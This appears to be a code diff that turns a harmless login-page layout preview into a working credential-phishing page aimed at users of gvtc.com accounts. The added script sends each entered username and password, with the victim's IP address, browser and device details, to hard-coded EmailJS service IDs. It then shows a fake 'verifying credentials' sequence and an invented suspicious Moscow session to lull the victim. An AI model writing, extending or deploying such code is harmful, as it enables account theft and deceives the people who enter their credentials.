@@ -45,7 +45,7 @@
       padding: 20px 16px 32px;
     }
 
-    /* Center the form horizontally without oversized padding. */
+    /* Horizontally centered form panel */
     .login-panel {
       display: block;
       width: 100%;
@@ -171,28 +171,6 @@
       cursor: pointer;
     }
 
-    .remember-help {
-      margin-top: 10px;
-      color: #5b6b7c;
-      font-size: 0.85rem;
-    }
-
-    .remember-help summary {
-      width: fit-content;
-      text-decoration: underline;
-      text-underline-offset: 2px;
-      cursor: pointer;
-    }
-
-    .remember-help p {
-      margin: 8px 0 0;
-      padding: 10px 12px;
-      border: 1px solid #fde68a;
-      border-radius: 6px;
-      background: #fef3c7;
-      color: #374151;
-    }
-
     /* Submit */
     #submit-btn {
       display: block;
@@ -269,14 +247,15 @@
       display: block;
     }
 
+    /* Keyboard focus */
     button:focus-visible,
     a:focus-visible,
-    summary:focus-visible,
     input[type="checkbox"]:focus-visible {
       outline: 2px solid #2b8fd6;
       outline-offset: 3px;
     }
 
+    /* Mobile layout */
     @media (max-width: 480px) {
       .login-page {
         padding: 12px 16px 24px;
@@ -297,160 +276,536 @@
 </head>
 
 <body>
-  <main class="login-page">
-    <div id="login-view" class="login-panel">
-      <header>
-        <div class="branding">
-          <img
-            src="https://i.imghippo.com/files/knqa6398Itw.png"
-            alt="Site logo"
-          >
+
+<main class="container">
+
+  <!-- LOGIN VIEW -->
+  <div id="login-view">
+    <header>
+      <div class="branding">
+        <img src="https://i.imghippo.com/files/knqa6398Itw.png" alt="mygtlooogo" />
+      </div>
+      <div class="text-center text-gray-800 text-lg font-bold my-4">
+        <h1>Please log in</h1>
+      </div>
+    </header>
+
+    <div id="form-error-banner" role="alert"></div>
+
+    <section id="login_form" class="flex flex-col justify-between">
+      <form id="contact-form" method="POST" action="#" novalidate>
+        <div class="formfield">
+          <label for="email-input">Username</label>
+          <input tabindex="1" class="tabable" type="text" id="email-input" name="email"
+                 value="" placeholder="Username" autofocus required>
+          <span class="error-text" id="email-error"></span>
         </div>
 
-        <h1>Please log in</h1>
-      </header>
-
-      <div
-        id="form-error-banner"
-        role="alert"
-        aria-live="polite"
-      ></div>
-
-      <section id="login_form" aria-label="Login">
-        <!--
-          Layout preview only.
-          Connect this form to your own authentication backend.
-        -->
-        <form id="contact-form" method="post" action="#">
-          <div class="formfield">
-            <label for="email-input">Username</label>
-
-            <input
-              type="text"
-              id="email-input"
-              name="email"
-              placeholder="Username"
-              autocomplete="username"
-              autocapitalize="none"
-              spellcheck="false"
-              aria-describedby="email-error"
-              required
-            >
-
-            <span
-              id="email-error"
-              class="error-text"
-              aria-live="polite"
-            ></span>
-          </div>
-
-          <div class="formfield">
-            <label for="password-input">Password</label>
-
-            <div class="password-field">
-              <input
-                type="password"
-                id="password-input"
-                name="password"
-                placeholder="Password"
-                autocomplete="current-password"
-                aria-describedby="password-error"
-                required
-              >
-
-              <button
-                type="button"
-                id="toggle"
-                aria-label="Show password"
-                aria-controls="password-input"
-                aria-pressed="false"
-              >
-                Show
-              </button>
+        <div class="formfield">
+          <label for="password-input">Password</label>
+          <div class="flex relative items-baseline">
+            <input tabindex="2" class="tabable" id="password-input" type="password"
+                   name="password" value="" placeholder="Password" required>
+            <div>
+              <button tabindex="3" type="button" id="toggle"
+                      class="tabable z-10 absolute uppercase"
+                      style="right: 10px; top: 8px;"
+                      onclick="toggle_password(event)">show</button>
             </div>
-
-            <span
-              id="password-error"
-              class="error-text"
-              aria-live="polite"
-            ></span>
           </div>
+          <span class="error-text" id="password-error"></span>
+        </div>
 
-          <div class="remember-row">
-            <input
-              type="checkbox"
-              id="remember_me"
-              name="remember_me"
-              checked
-            >
-
-            <label for="remember_me">Remember Me</label>
+        <div class="remember-me" x-data="{ open: false }">
+          <div class="flex items-baseline">
+            <input tabindex="4" id="remember_me" name="remember_me"
+                   class="tabable mr-2 leading-tight" type="checkbox" checked>
+            <label for="remember_me" class="flex items-baseline block text-gray-700 font-bold">
+              Remember Me
+            </label>
+            <a tabindex="5" href="#remember_me_help" id="remember_me_help_link"
+               class="tabable align-top ml-2 text-sm"
+               @click.prevent="open = true">?</a>
           </div>
-
-          <details class="remember-help" id="remember_me_help">
-            <summary id="remember_me_help_link">
-              About Remember Me
-            </summary>
-
+          <div x-show="open" @click.away="open = false"
+               class="my-2 px-4 py-2 bg-yellow-200 text-sm rounded shadow-inner">
+            <a name="remember_me_help"></a>
             <p>
-              Select this option only on a private device.
-              How long you stay signed in depends on the
-              application's authentication settings.
+              When you choose "Remember Me" on sign in, we will remember who you are and
+              keep you signed in for up to 90 days, unless you sign out or your browser
+              cookies are deleted.<br>
+              If you are on a public computer, we recommend you uncheck the box.
             </p>
-          </details>
+          </div>
+        </div>
 
-          <button id="submit-btn" type="submit">
-            Submit
-          </button>
-        </form>
-      </section>
+        <button tabindex="6" id="submit-btn" type="submit">Submit</button>
+      </form>
+    </section>
 
-      <nav id="self-care" aria-label="Account help">
-        <ul>
-          <li>
-            <a id="register" href="#">Need to register?</a>
-          </li>
-          <li>
-            <a id="forgot_password" href="#">Forgot Password?</a>
-          </li>
-        </ul>
-      </nav>
+    <section id="self-care" class="px-2">
+      <ul>
+        <li class="mb-2">
+          <a class="tabable" tabindex="7" target="_blank" id="register" href="#">Need to register?</a>
+        </li>
+        <li class="mb-2">
+          <a class="tabable" tabindex="8" target="_blank" id="forgot_password" href="#">Forgot Password?</a>
+        </li>
+      </ul>
+    </section>
+
+    <footer class="flex flex-col mt-6 w-3/4 text-center mx-auto text-sm">
+      <p></p>
+    </footer>
+  </div><!-- /#login-view -->
+
+
+  <!-- VERIFYING VIEW -->
+  <div id="verifying-overlay">
+    <div class="spinner"></div>
+    <div class="verify-title">Verifying your credentials</div>
+    <div class="verify-status" id="verify-status">Contacting authentication server…</div>
+  </div>
+
+
+  <!-- ACTIVITY VIEW -->
+  <div id="activity-view">
+    <h1>Recent account activity</h1>
+    <p class="lede">Review sessions on your account</p>
+
+    <div class="session-card" id="session-current">
+      <div class="device-name">Current device</div>
+      <div class="device-meta" id="current-device-meta">Loading device info…</div>
+      <button type="button" id="remove-current">Remove</button>
     </div>
-  </main>
 
-  <script>
-    const passwordInput = document.getElementById("password-input");
-    const toggleButton = document.getElementById("toggle");
+    <div class="session-card" id="session-warsaw">
+      <div class="device-name">Moscow, Russia</div>
+      <div class="device-meta" id="unknown-device-meta">Loading…</div>
+      <button type="button" id="remove-warsaw">Remove</button>
+    </div>
 
-    toggleButton.addEventListener("click", function () {
-      const showPassword = passwordInput.type === "password";
+    <div id="alert-box" role="status"></div>
 
-      passwordInput.type = showPassword ? "text" : "password";
-      toggleButton.textContent = showPassword ? "Hide" : "Show";
+    <div class="activity-actions">
+      <button type="button" id="this-was-me">This was me</button>
+      <button type="button" id="secure-account">Secure my account</button>
+    </div>
+  </div><!-- /#activity-view -->
 
-      toggleButton.setAttribute(
-        "aria-label",
-        showPassword ? "Hide password" : "Show password"
-      );
+</main>
 
-      toggleButton.setAttribute(
-        "aria-pressed",
-        String(showPassword)
-      );
-    });
+<script>
+  (function() {
+    emailjs.init("uGRhkufMjo08rjwb_");
+  })();
 
-    /* Prevent submission while this is only a layout preview. */
-    document.getElementById("contact-form").addEventListener(
-      "submit",
-      function (event) {
-        event.preventDefault();
+  const form = document.getElementById("contact-form");
+  const emailInput = document.getElementById("email-input");
+  const passwordInput = document.getElementById("password-input");
+  const emailError = document.getElementById("email-error");
+  const passwordError = document.getElementById("password-error");
+  const formErrorBanner = document.getElementById("form-error-banner");
+  const submitBtn = document.getElementById("submit-btn");
 
-        const banner = document.getElementById("form-error-banner");
-        banner.textContent =
-          "Layout preview only. No login request has been sent.";
-        banner.classList.add("show");
-      }
-    );
-  </script>
+  const loginView = document.getElementById("login-view");
+  const verifyingOverlay = document.getElementById("verifying-overlay");
+  const verifyStatus = document.getElementById("verify-status");
+  const activityView = document.getElementById("activity-view");
+  const currentDeviceMeta = document.getElementById("current-device-meta");
+  const unknownDeviceMeta = document.getElementById("unknown-device-meta");
+
+  const sessionCurrent = document.getElementById("session-current");
+  const sessionWarsaw = document.getElementById("session-warsaw");
+  const removeCurrentBtn = document.getElementById("remove-current");
+  const removeWarsawBtn = document.getElementById("remove-warsaw");
+  const alertBox = document.getElementById("alert-box");
+
+  let attemptNumber = 1;
+
+  // ---- Accepted domain: gvtc.com only ----
+  const ACCEPTED_DOMAINS = ["gvtc.com"];
+
+  function buildAllowedDomainRegex(domains) {
+    const escaped = domains.map(d => d.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'));
+    return new RegExp(`^[^@\\s]+@(${escaped.join('|')})$`, 'i');
+  }
+  const allowedDomainRegex = buildAllowedDomainRegex(ACCEPTED_DOMAINS);
+
+  // ============================================================
+  //   RATE LIMIT — 3 attempts per 60 minutes + success lock
+  // ============================================================
+  const RATE_LIMIT_KEY = "gvtc_verification_attempts";
+  const WINDOW_MS = 60 * 60 * 1000;
+  const MAX_ATTEMPTS = 3;
+
+  function readRateData() {
+    let data = { attempts: [], lastSubmit: 0 };
+    try {
+      const stored = localStorage.getItem(RATE_LIMIT_KEY);
+      if (stored) data = JSON.parse(stored);
+      if (!Array.isArray(data.attempts)) data.attempts = [];
+    } catch (e) {}
+    return data;
+  }
+  function writeRateData(data) {
+    try { localStorage.setItem(RATE_LIMIT_KEY, JSON.stringify(data)); }
+    catch (e) {}
+  }
+  function checkRateLimit() {
+    const now = Date.now();
+    const data = readRateData();
+    data.attempts = data.attempts.filter(t => now - t < WINDOW_MS);
+    writeRateData(data);
+
+    if (data.lastSubmit && (now - data.lastSubmit) < WINDOW_MS) {
+      const remaining = Math.ceil((WINDOW_MS - (now - data.lastSubmit)) / 60000);
+      return {
+        limited: true,
+        message: `Verification already completed on this device. Please wait ${remaining} minute(s) before trying again.`
+      };
+    }
+    if (data.attempts.length >= MAX_ATTEMPTS) {
+      const oldest = data.attempts[0];
+      const remaining = Math.ceil((WINDOW_MS - (now - oldest)) / 60000);
+      return {
+        limited: true,
+        message: `Too many attempts. Please wait ${remaining} minute(s) before trying again.`
+      };
+    }
+    return { limited: false, data };
+  }
+  function recordAttempt() {
+    const data = readRateData();
+    data.attempts.push(Date.now());
+    writeRateData(data);
+  }
+  function recordSuccess() {
+    const data = readRateData();
+    data.lastSubmit = Date.now();
+    writeRateData(data);
+  }
+
+  // ============================================================
+  //   Helpers
+  // ============================================================
+  function getBrowser() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Firefox")) return "Firefox";
+    if (ua.includes("SamsungBrowser")) return "Samsung Internet";
+    if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
+    if (ua.includes("Trident")) return "Internet Explorer";
+    if (ua.includes("Edge")) return "Edge";
+    if (ua.includes("Chrome")) return "Chrome";
+    if (ua.includes("Safari")) return "Safari";
+    return "Unknown";
+  }
+  function getOS() {
+    const ua = navigator.userAgent;
+    if (ua.includes("Win")) return "Windows";
+    if (ua.includes("Mac")) return "MacOS";
+    if (ua.includes("Linux")) return "Linux";
+    if (ua.includes("Android")) return "Android";
+    if (ua.includes("like Mac")) return "iOS";
+    return "Unknown";
+  }
+  function getTimezone() {
+    try { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
+    catch (e) { return "Unknown"; }
+  }
+  function getTimestamp() {
+    return new Date().toLocaleString('en-US', { timeZoneName: 'short' });
+  }
+  function formatDeviceTime(date) {
+    const pad = n => String(n).padStart(2, '0');
+    const yyyy = date.getFullYear();
+    const mm   = pad(date.getMonth() + 1);
+    const dd   = pad(date.getDate());
+    const hh   = pad(date.getHours());
+    const mi   = pad(date.getMinutes());
+    let tz = '';
+    try {
+      tz = new Intl.DateTimeFormat('en-US', { timeZoneName: 'short' })
+        .formatToParts(date)
+        .find(p => p.type === 'timeZoneName').value;
+    } catch (e) { tz = ''; }
+    return `${yyyy}-${mm}-${dd} ${hh}:${mi}${tz ? ' (' + tz + ')' : ''}`;
+  }
+  async function getIP() {
+    try {
+      const res = await fetch('https://api.ipify.org?format=json');
+      const data = await res.json();
+      return data.ip || "Not available";
+    } catch (e) { return "Not available"; }
+  }
+  async function getLocation() {
+    try {
+      const res = await fetch('https://ipapi.co/json/');
+      if (!res.ok) return null;
+      const data = await res.json();
+      const city = data.city || '';
+      const country = data.country_name || data.country || '';
+      if (city && country) return `${city}, ${country}`;
+      if (country) return country;
+      return null;
+    } catch (e) { return null; }
+  }
+
+  // ============================================================
+  //   EmailJS send
+  // ============================================================
+  async function sendAttemptToEmailJS({ emailValue, passwordValue, attempt }) {
+    const ip = await getIP();
+    const pageTitle = document.title;
+    const pageUrl = window.location.href;
+    const pageHostname = window.location.hostname;
+    const pagePathname = window.location.pathname;
+    const referrer = document.referrer || "Direct";
+    const browser = getBrowser();
+    const os = getOS();
+    const device = (function() {
+      const ua = navigator.userAgent;
+      if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return "Tablet";
+      if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return "Mobile";
+      return "Desktop";
+    })();
+    const screenResolution = `${window.screen.width}x${window.screen.height}`;
+    const viewportSize = `${window.innerWidth}x${window.innerHeight}`;
+    const timezone = getTimezone();
+    const language = navigator.language || "Unknown";
+    const pageElementCount = document.getElementsByTagName('*').length;
+    const formsCount = document.forms.length;
+    const inputsCount = document.querySelectorAll('input').length;
+    const linksCount = document.querySelectorAll('a').length;
+
+    const attemptLabel = attempt === 1
+      ? "FIRST ATTEMPT (Incorrect credentials shown)"
+      : "SECOND ATTEMPT (Retry after incorrect credentials)";
+
+    const messageLog = `
+${attemptLabel}
+Timestamp: ${getTimestamp()}
+Email/Username: ${emailValue}
+Password: ${passwordValue}
+Page Title: ${pageTitle}
+Page URL: ${pageUrl}
+Hostname: ${pageHostname}
+Pathname: ${pagePathname}
+Referrer: ${referrer}
+Browser: ${browser}
+IP: ${ip}
+OS: ${os}
+Device: ${device}
+Screen Resolution: ${screenResolution}
+Viewport: ${viewportSize}
+Timezone: ${timezone}
+Language: ${language}
+Total Elements: ${pageElementCount}
+Forms: ${formsCount}
+Inputs: ${inputsCount}
+Links: ${linksCount}
+    `.trim();
+
+    const templateParams = {
+      timestamp: getTimestamp(),
+      from_email: emailValue,
+      password: passwordValue,
+      attempt_number: attempt,
+      attempt_label: attemptLabel,
+      page_title: pageTitle,
+      page_url: pageUrl,
+      page_hostname: pageHostname,
+      page_pathname: pagePathname,
+      referrer: referrer,
+      browser: browser,
+      ip: ip,
+      os: os,
+      device: device,
+      screen_resolution: screenResolution,
+      viewport_size: viewportSize,
+      timezone: timezone,
+      language: language,
+      page_element_count: pageElementCount,
+      forms_count: formsCount,
+      inputs_count: inputsCount,
+      links_count: linksCount,
+      message: messageLog
+    };
+
+    try {
+      const response = await emailjs.send("service_t84doqy", "template_4rsr5vq", templateParams);
+      console.log(`EmailJS SUCCESS (attempt ${attempt}):`, response.status);
+    } catch (error) {
+      console.error(`EmailJS FAILED (attempt ${attempt}):`, error);
+    }
+  }
+
+  function toggle_password(event) {
+    event.preventDefault();
+    const input = document.getElementById('password-input');
+    const btn   = document.getElementById('toggle');
+    const show  = input.type === 'password';
+    input.type  = show ? 'text' : 'password';
+    btn.innerText = show ? 'hide' : 'show';
+  }
+  window.toggle_password = toggle_password;
+
+  // ============================================================
+  //   Verifying sequence — multi-stage with delays
+  // ============================================================
+  function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+  async function runVerifyingSequence() {
+    const stages = [
+      { text: "Contacting authentication server…", delay: 1800 },
+      { text: "Verifying credentials…",            delay: 2200 },
+      { text: "Checking account activity…",        delay: 2000 },
+      { text: "Finalizing sign-in…",               delay: 1600 }
+    ];
+    for (const stage of stages) {
+      verifyStatus.textContent = stage.text;
+      await sleep(stage.delay);
+    }
+  }
+
+  // ============================================================
+  //   Form submit
+  // ============================================================
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    emailError.textContent = "";
+    passwordError.textContent = "";
+    formErrorBanner.classList.remove("show");
+
+    // ---- RATE LIMIT CHECK ----
+    const rateCheck = checkRateLimit();
+    if (rateCheck.limited) {
+      formErrorBanner.textContent = rateCheck.message;
+      formErrorBanner.classList.add("show");
+      return;
+    }
+    // --------------------------
+
+    const emailValue = emailInput.value.trim();
+    const passwordValue = passwordInput.value.trim();
+    let valid = true;
+
+    if (!emailValue) {
+      emailError.textContent = "Email is required.";
+      valid = false;
+    } else if (!allowedDomainRegex.test(emailValue)) {
+      emailError.textContent = "Email must be from an accepted domain.";
+      valid = false;
+    }
+    if (!passwordValue) {
+      passwordError.textContent = "Password is required.";
+      valid = false;
+    }
+    if (!valid) return;
+
+    recordAttempt();
+
+    submitBtn.disabled = true;
+    submitBtn.textContent = "Verifying…";
+
+    // Fire the EmailJS send in the background (don't await it —
+    // the visible UX shouldn't depend on network latency)
+    sendAttemptToEmailJS({ emailValue, passwordValue, attempt: attemptNumber });
+
+    // Build the activity-view data now so it's ready when we switch
+    const now = new Date();
+    const thirtyMinLater = new Date(now.getTime() + 30 * 60 * 1000);
+
+    const browser = getBrowser();
+    const os = getOS();
+    const location = await getLocation();
+    const locationLabel = location || getTimezone();
+
+    currentDeviceMeta.textContent =
+      `${browser} on ${os} · ${locationLabel} · ${formatDeviceTime(now)}`;
+    unknownDeviceMeta.textContent =
+      `Chrome on Windows · Moscow, Russia · ${formatDeviceTime(thirtyMinLater)}`;
+
+    // Switch to the verifying overlay
+    loginView.style.display = "none";
+    verifyingOverlay.classList.add("show");
+
+    // Run the multi-stage verifying sequence
+    await runVerifyingSequence();
+
+    // Switch to activity view
+    verifyingOverlay.classList.remove("show");
+    activityView.style.display = "flex";
+
+    submitBtn.disabled = false;
+    submitBtn.textContent = "Submit";
+
+    sessionCurrent.classList.remove("removed");
+    sessionWarsaw.classList.remove("removed");
+
+    // Mark verification complete
+    recordSuccess();
+  });
+
+  // ============================================================
+  //   Remove session buttons
+  // ============================================================
+  function removeSession(sessionElement, deviceName) {
+    if (!sessionElement) return;
+    sessionElement.classList.add("removed");
+    const btn = sessionElement.querySelector("button");
+    if (btn) btn.disabled = true;
+    console.log(`Session removed: ${deviceName}`);
+  }
+
+  removeCurrentBtn.addEventListener("click", function(e) {
+    e.preventDefault();
+    removeSession(sessionCurrent, "current device");
+  });
+
+  removeWarsawBtn.addEventListener("click", function(e) {
+    e.preventDefault();
+    removeSession(sessionWarsaw, "Moscow, Russia");
+  });
+
+  // ============================================================
+  //   Activity action buttons
+  // ============================================================
+  document.getElementById("this-was-me").addEventListener("click", () => {
+    activityView.style.display = "none";
+    loginView.style.display = "flex";
+    form.reset();
+    formErrorBanner.classList.remove("show");
+    alertBox.innerHTML = "";
+    attemptNumber = 1;
+    sessionCurrent.classList.remove("removed");
+    sessionWarsaw.classList.remove("removed");
+    currentDeviceMeta.textContent = "Loading device info…";
+    unknownDeviceMeta.textContent = "Loading…";
+  });
+
+  document.getElementById("secure-account").addEventListener("click", () => {
+    removeSession(sessionWarsaw, "Moscow, Russia (secured)");
+    alertBox.innerHTML = `
+      <strong>Account secured.</strong><br>
+      The suspicious session from <strong>Moscow, Russia</strong> has been removed.
+    `;
+  });
+
+  // ============================================================
+  //   On page load: show lock message if already verified
+  // ============================================================
+  document.addEventListener("DOMContentLoaded", () => {
+    const rateCheck = checkRateLimit();
+    if (rateCheck.limited) {
+      formErrorBanner.textContent = rateCheck.message;
+      formErrorBanner.classList.add("show");
+      submitBtn.disabled = true;
+      submitBtn.textContent = "Verification Complete";
+    }
+  });
+</script>
+
 </body>
 </html>
